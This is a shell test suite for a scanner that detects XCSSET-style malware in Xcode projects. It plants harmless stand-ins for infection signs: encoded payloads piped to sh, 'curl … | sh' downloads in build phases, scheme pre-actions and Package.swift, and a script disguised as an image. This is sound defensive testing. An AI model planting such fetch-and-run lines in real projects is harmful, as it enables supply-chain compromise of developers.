#!/usr/bin/env bash
# Tests for Scripts/ScanForXcsset.sh.
# Each test builds a throwaway Xcode project in a temp folder, plants one
# infection sign (or none) and checks whether the scanner passes or fails.
# The fake payloads only decode to "echo hi"; nothing here is executed.

set -uo pipefail

repoRoot="$(cd "$(dirname "$0")/../.." && pwd)"
scanner="$repoRoot/Scripts/ScanForXcsset.sh"
workDir="$(mktemp -d)"
trap 'rm -rf "$workDir"' EXIT

passedCount=0
failedCount=0

# Creates a minimal project: a real pbxproj copy and an asset catalog.
MakeProject() {
  local projectDir="$workDir/$1"
  mkdir -p "$projectDir/App.xcodeproj" "$projectDir/App/Assets.xcassets"
  cp "$repoRoot/Lezgo.xcodeproj/project.pbxproj" "$projectDir/App.xcodeproj/project.pbxproj"
  echo '{ "info" : { "author" : "xcode", "version" : 1 } }' > "$projectDir/App/Assets.xcassets/Contents.json"
  echo "$projectDir"
}

AddShellScriptPhase() {
  cat >> "$1/App.xcodeproj/project.pbxproj" <<EOF
/* Begin PBXShellScriptBuildPhase section */
		AA0000000000000000000001 /* Run Script */ = {
			isa = PBXShellScriptBuildPhase;
			shellScript = "$2\n";
		};
/* End PBXShellScriptBuildPhase section */
EOF
}

# ExpectScan <name> <expected: pass|fail> <project dir>
ExpectScan() {
  local name="$1" expected="$2" projectDir="$3" actual
  if "$scanner" "$projectDir" > "$workDir/output.txt" 2>&1; then actual="pass"; else actual="fail"; fi

  if [[ "$actual" == "$expected" ]]; then
    passedCount=$((passedCount + 1))
    echo "ok   $name"
  else
    failedCount=$((failedCount + 1))
    echo "FAIL $name (expected $expected, got $actual)"
    sed 's/^/     /' "$workDir/output.txt"
  fi
}

project="$(MakeProject cleanProject)"
ExpectScan "clean project passes" pass "$project"

project="$(MakeProject harmlessScript)"
AddShellScriptPhase "$project" 'if which swiftlint > /dev/null; then swiftlint; fi'
ExpectScan "harmless build script passes" pass "$project"

project="$(MakeProject base64Payload)"
AddShellScriptPhase "$project" 'echo ZWNobyBoaQo= | base64 -d | sh'
ExpectScan "base64 payload piped to sh fails" fail "$project"

project="$(MakeProject xxdPayload)"
AddShellScriptPhase "$project" 'echo 6563686f206869 | xxd -p -r | bash'
ExpectScan "xxd payload piped to bash fails" fail "$project"

project="$(MakeProject curlDownload)"
AddShellScriptPhase "$project" 'curl -fsSL https://example.invalid/a -o /tmp/a'
ExpectScan "curl download in build script fails" fail "$project"

project="$(MakeProject osascriptCall)"
AddShellScriptPhase "$project" 'osascript -e \"return 1\"'
ExpectScan "osascript in build script fails" fail "$project"

project="$(MakeProject longEncodedBlob)"
AddShellScriptPhase "$project" "echo $(printf 'QUFB%.0s' {1..30})"
ExpectScan "long encoded blob fails" fail "$project"

project="$(MakeProject deviceFamilyPayload)"
sed -i.bak 's/TARGETED_DEVICE_FAMILY = "1,2";/TARGETED_DEVICE_FAMILY = "1,2 $(echo hi)";/' "$project/App.xcodeproj/project.pbxproj"
ExpectScan "payload hidden in device family setting fails" fail "$project"

project="$(MakeProject targetDeviceFamilyPayload)"
echo '				TARGET_DEVICE_FAMILY = "ZWNobyBoaQo=";' >> "$project/App.xcodeproj/project.pbxproj"
ExpectScan "payload in TARGET_DEVICE_FAMILY fails" fail "$project"

project="$(MakeProject schemePreAction)"
mkdir -p "$project/App.xcodeproj/xcshareddata/xcschemes"
cat > "$project/App.xcodeproj/xcshareddata/xcschemes/App.xcscheme" <<'EOF'
<Scheme><BuildAction><PreActions><ExecutionAction ActionType = "Xcode.IDEStandardExecutionActionsCore.ExecutionActionType.ShellScriptAction">
<ActionContent title = "Run Script" scriptText = "curl -fsSL https://example.invalid/a | sh"></ActionContent>
</ExecutionAction></PreActions></BuildAction></Scheme>
EOF
ExpectScan "scheme pre-action download fails" fail "$project"

project="$(MakeProject hiddenFolderInProject)"
mkdir -p "$project/App.xcodeproj/.hidden"
echo "payload" > "$project/App.xcodeproj/.hidden/data"
ExpectScan "hidden folder inside xcodeproj fails" fail "$project"

project="$(MakeProject dsStoreInProject)"
echo "finder" > "$project/App.xcodeproj/.DS_Store"
ExpectScan ".DS_Store inside xcodeproj passes" pass "$project"

project="$(MakeProject scriptInAssets)"
mkdir -p "$project/App/Assets.xcassets/Icon.imageset"
printf '#!/bin/sh\necho hi\n' > "$project/App/Assets.xcassets/Icon.imageset/Icon.png"
ExpectScan "script disguised as image in asset catalog fails" fail "$project"

project="$(MakeProject executableInAssets)"
mkdir -p "$project/App/Assets.xcassets/Logo.imageset"
echo "data" > "$project/App/Assets.xcassets/Logo.imageset/Logo.png"
chmod +x "$project/App/Assets.xcassets/Logo.imageset/Logo.png"
ExpectScan "executable file in asset catalog fails" fail "$project"

project="$(MakeProject machOBinary)"
printf '\xcf\xfa\xed\xfe\x07\x00\x00\x01' > "$project/App/helper"
ExpectScan "Mach-O binary in repository fails" fail "$project"

project="$(MakeProject compiledAppleScript)"
echo "data" > "$project/App/run.scpt"
ExpectScan "compiled AppleScript in repository fails" fail "$project"

project="$(MakeProject packageManifestPayload)"
echo 'let x = "curl -fsSL https://example.invalid/a | sh"' > "$project/Package.swift"
ExpectScan "download piped to shell in Package.swift fails" fail "$project"

echo
echo "$passedCount passed, $failedCount failed"
[[ "$failedCount" -eq 0 ]]
